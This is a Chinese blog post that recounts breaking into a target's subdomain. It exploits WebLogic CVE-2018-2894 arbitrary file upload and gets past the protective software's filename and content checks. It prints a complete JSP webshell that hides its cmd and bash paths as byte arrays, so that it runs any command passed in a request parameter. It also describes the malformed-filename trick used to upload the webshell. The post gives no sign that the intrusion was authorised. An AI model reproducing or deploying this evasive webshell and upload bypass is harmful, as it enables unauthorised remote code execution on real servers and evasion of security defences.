<!DOCTYPE html><html lang="zh-Hans"><head><meta name="generator" content="Hexo 3.9.0"><meta http-equiv="content-type" content="text/html; charset=utf-8"><meta content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" name="viewport"><meta content="yes" name="apple-mobile-web-app-capable"><meta content="black-translucent" name="apple-mobile-web-app-status-bar-style"><meta content="telephone=no" name="format-detection"><meta name="description"><title>利用Java反射和类加载机制绕过Jsp后门检拿shell的一次经历 | Guko's Blog</title><link rel="stylesheet" type="text/css" href="/css/style.css?v=0.0.0"><link rel="stylesheet" type="text/css" href="//lib.baomitu.com/normalize/8.0.1/normalize.min.css"><link rel="stylesheet" type="text/css" href="//lib.baomitu.com/pure/1.0.0/pure-min.css"><link rel="stylesheet" type="text/css" href="//lib.baomitu.com/pure/1.0.0/grids-responsive-min.css"><link rel="stylesheet" href="//lib.baomitu.com/font-awesome/4.7.0/css/font-awesome.min.css"><script type="text/javascript" src="//lib.baomitu.com/jquery/3.4.0/jquery.min.js"></script><link rel="icon" mask sizes="any" href="/favicon.ico"><link rel="Shortcut Icon" type="image/x-icon" href="/favicon.ico"><link rel="apple-touch-icon" href="/apple-touch-icon.png"><link rel="apple-touch-icon-precomposed" href="/apple-touch-icon.png"></head><body><div class="body_container"><div id="header"><div class="site-name"><h1 class="hidden">利用Java反射和类加载机制绕过Jsp后门检拿shell的一次经历</h1><a id="logo" href="/.">Guko's Blog</a><p class="description"></p></div><div id="nav-menu"><a class="current" href="/."><i class="fa fa-home"> Start</i></a><a href="/archives/"><i class="fa fa-archive"> Archiv</i></a><a href="/about/"><i class="fa fa-user"> Über</i></a><a href="/atom.xml"><i class="fa fa-rss"> RSS</i></a></div></div><div class="pure-g" id="layout"><div class="pure-u-1 pure-u-md-3-4"><div class="content_container"><div class="post"><h1 class="post-title">利用Java反射和类加载机制绕过Jsp后门检拿shell的一次经历</h1><div class="post-meta">Aug 27, 2019</div><div class="post-content"><h4 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00:前言"></a>0x00:前言</h4><p>主站搞不下来，只能看看子域名有没有什么收获，发现任意文件上传，但是有防护软件对上传文件的后缀跟内容作了检测，不能是jsp后缀，常规的jsp后门都会被杀，且只要检测到是jsp后缀跟恶意内容ip就会被防护软件拉黑，导致访问不了网站。</p>
<h4 id="0x01-发现漏洞"><a href="#0x01-发现漏洞" class="headerlink" title="0x01:发现漏洞"></a>0x01:发现漏洞</h4><p>这个漏洞很明显，是直接开放了7001端口，这个端口第一时间想到的肯定是weblogic，看一下版本是12.2.1.3.0的,我记得版本是存在相关漏洞的。<br><img src="/2019/08/27/利用Java反射和类加载机制绕过Jsp后门检拿shell的一次经历/1.png" alt="1"></p>
<p>直接使用rabbitmask表哥写的<a href="https://www.freebuf.com/column/197339.html" target="_blank" rel="noopener">weblogic++</a>检测一波发现存在CVE-2018-2894任意文件上传漏洞<br><img src="/2019/08/27/利用Java反射和类加载机制绕过Jsp后门检拿shell的一次经历/2.png" alt="1"></p>
<p>WebLogic管理端未授权的两个页面存在任意上传getshell漏洞，可直接获取权限。两个页面分别为/ws_utc/begin.do，/ws_utc/config.do；漏洞的影响范围 Oracle WebLogic Server，版本10.3.6.0，12.1.3.0，12.2.1.2，12.2.1.3。</p>
<p>关于CVE-2018-2894任意文件上传漏洞原理可参考云影实验室写的<a href="https://www.freebuf.com/vuls/178510.html" target="_blank" rel="noopener">WebLogic两处任意文件上传漏洞动态分析（CVE-2018-2894）</a>根据漏洞直接访问<a href="http://www.test.com/ws_utc/config.do发现确实存在。" target="_blank" rel="noopener">http://www.test.com/ws_utc/config.do发现确实存在。</a><br><img src="/2019/08/27/利用Java反射和类加载机制绕过Jsp后门检拿shell的一次经历/3.png" alt="1"></p>
<h4 id="0x02-漏洞利用"><a href="#0x02-漏洞利用" class="headerlink" title="0x02:漏洞利用"></a>0x02:漏洞利用</h4><p>把文件改一下，改成css这个应用静态文件具有访问权限，改了后直接点击安全选项，直接上传。</p>
<p>上传的时候发现jsp后缀是上传不上去的，改成txt后缀可以上传成功，上床jspx也不行，当时上传的jspx是用的冰蝎自带的，还有最令人恶心的是当被防护软件检测到上传带有jsp后缀跟木马内容后直接把ip给拉黑，当我把手中的能用的ip都消耗掉后我发现还是上传不上去，由于太菜，自此陷入僵局。</p>
<h4 id="0x03-利用Java反射和类加载机制绕过JSP后门检测"><a href="#0x03-利用Java反射和类加载机制绕过JSP后门检测" class="headerlink" title="0x03:利用Java反射和类加载机制绕过JSP后门检测"></a>0x03:利用Java反射和类加载机制绕过JSP后门检测</h4><p>在把自己所有能想到的方法尝试后，无果，最终让大佬帮看了下，直接就传上去了……逐请教是如何搞定的，发现成功上传有两点要解决，由于对文件后缀跟文件内容作了检测，那么要成功要上传，就要解决文件名不被检测，这里使用的畸形文件名去掉对于上传的文件名的双引号并在前面加上‘，要绕过文件内容的检测需要这里用到了<a href="https://xz.aliyun.com/t/2342" target="_blank" rel="noopener">利用Java反射和类加载机制绕过JSP后门检测</a>文章中的方法,把表哥写的现成的马保存为’333.jsp直接拿来用。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line">&lt;%@ page pageEncoding=&quot;utf-8&quot;%&gt;</span><br><span class="line">&lt;%@ page import=&quot;java.util.Scanner&quot; %&gt;</span><br><span class="line">&lt;HTML&gt;</span><br><span class="line">&lt;title&gt;Just For Fun&lt;/title&gt;</span><br><span class="line">&lt;BODY&gt;</span><br><span class="line">&lt;H3&gt;Build By LandGrey&lt;/H3&gt;</span><br><span class="line">&lt;FORM METHOD=&quot;POST&quot; NAME=&quot;form&quot; ACTION=&quot;#&quot;&gt;</span><br><span class="line">    &lt;INPUT TYPE=&quot;text&quot; NAME=&quot;q&quot;&gt;</span><br><span class="line">    &lt;INPUT TYPE=&quot;submit&quot; VALUE=&quot;Fly&quot;&gt;</span><br><span class="line">&lt;/FORM&gt;</span><br><span class="line"></span><br><span class="line">&lt;%</span><br><span class="line">    String op=&quot;Got Nothing&quot;;</span><br><span class="line">    String query = request.getParameter(&quot;q&quot;);</span><br><span class="line">    String fileSeparator = String.valueOf(java.io.File.separatorChar);</span><br><span class="line">    Boolean isWin;</span><br><span class="line">    if(fileSeparator.equals(&quot;\\&quot;))&#123;</span><br><span class="line">        isWin = true;</span><br><span class="line">    &#125;else&#123;</span><br><span class="line">        isWin = false;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    if (query != null) &#123;</span><br><span class="line">        ProcessBuilder pb;</span><br><span class="line">        if(isWin) &#123;</span><br><span class="line">            pb = new ProcessBuilder(new String(new byte[]&#123;99, 109, 100&#125;), new String(new byte[]&#123;47, 67&#125;), query);</span><br><span class="line">        &#125;else&#123;</span><br><span class="line">            pb = new ProcessBuilder(new String(new byte[]&#123;47, 98, 105, 110, 47, 98, 97, 115, 104&#125;), new String(new byte[]&#123;45, 99&#125;), query);</span><br><span class="line">        &#125;</span><br><span class="line">        Process process = pb.start();</span><br><span class="line">        Scanner sc = new Scanner(process.getInputStream()).useDelimiter(&quot;\\A&quot;);</span><br><span class="line">        op = sc.hasNext() ? sc.next() : op;</span><br><span class="line">        sc.close();</span><br><span class="line">    &#125;</span><br><span class="line">%&gt;</span><br><span class="line"></span><br><span class="line">&lt;PRE&gt;</span><br><span class="line">    &lt;%= op %&gt;&gt;</span><br><span class="line">&lt;/PRE&gt;</span><br><span class="line">&lt;/BODY&gt;</span><br><span class="line">&lt;/HTML&gt;</span><br></pre></td></tr></table></figure>

<p>再次上传,访问之，发现成功返回,由于没有可用的ip了，直接用手机访问的…….<br><img src="/2019/08/27/利用Java反射和类加载机制绕过Jsp后门检拿shell的一次经历/4.png" alt="1"></p>
<p>用tasklist查看运行程序，发现服务器上存在360……</p>
<p><img src="/2019/08/27/利用Java反射和类加载机制绕过Jsp后门检拿shell的一次经历/5.png" alt="1"></p>
<h4 id="0x04-总结"><a href="#0x04-总结" class="headerlink" title="0x04:总结"></a>0x04:总结</h4><p>两个绕过点</p>
<p>漏洞都是大家都懂的漏洞，主要是记录一下绕过防护软件的检测方法，其实这篇文章去年就被大佬们发出来了，要不是大哥甩给我，一直不知道可以用这个方法绕过jsp后门检测，所以多跟大师傅多接触接触，多请教请教，师傅们随便一指点就比自己瞎忙活半天有效的多。</p>
</div><div class="tags"></div></div></div></div><div class="pure-u-1-4 hidden_mid_and_down"><div id="sidebar"><div class="widget"><form class="search-form" action="//www.google.com/search" method="get" accept-charset="utf-8" target="_blank"><input type="text" name="q" maxlength="20" placeholder="Search"><input type="hidden" name="sitesearch" value="http://yoursite.com"></form></div><div class="widget"><div class="widget-title"><i class="fa fa-folder-o"> Kategorien</i></div></div><div class="widget"><div class="widget-title"><i class="fa fa-star-o"> Tags</i></div><div class="tagcloud"></div></div><div class="widget"><div class="widget-title"><i class="fa fa-file-o"> Letzte</i></div><ul class="post-list"><li class="post-list-item"><a class="post-list-link" href="/2019/08/27/利用Java反射和类加载机制绕过Jsp后门检拿shell的一次经历/">利用Java反射和类加载机制绕过Jsp后门检拿shell的一次经历</a></li></ul></div><div class="widget"><div class="widget-title"><i class="fa fa-external-link"> Blogroll</i></div><ul></ul><a href="http://www.example1.com/" title="site-name1" target="_blank">site-name1</a><ul></ul><a href="http://www.example2.com/" title="site-name2" target="_blank">site-name2</a><ul></ul><a href="http://www.example3.com/" title="site-name3" target="_blank">site-name3</a></div></div></div><div class="pure-u-1 pure-u-md-3-4"><div id="footer">Copyright © 2019 <a href="/." rel="nofollow">Guko's Blog.</a> Powered by<a rel="nofollow" target="_blank" href="https://hexo.io"> Hexo.</a><a rel="nofollow" target="_blank" href="https://github.com/tufu9441/maupassant-hexo"> Theme</a> by<a rel="nofollow" target="_blank" href="https://github.com/pagecho"> Cho.</a></div></div></div><a class="show" id="rocket" href="#top"></a><script type="text/javascript" src="/js/totop.js?v=0.0.0" async></script><script type="text/javascript" src="//lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js" async></script><script type="text/javascript" src="/js/fancybox.js?v=0.0.0" async></script><link rel="stylesheet" type="text/css" href="//lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css"><script type="text/javascript" src="/js/codeblock-resizer.js?v=0.0.0"></script><script type="text/javascript" src="/js/smartresize.js?v=0.0.0"></script></div></body></html>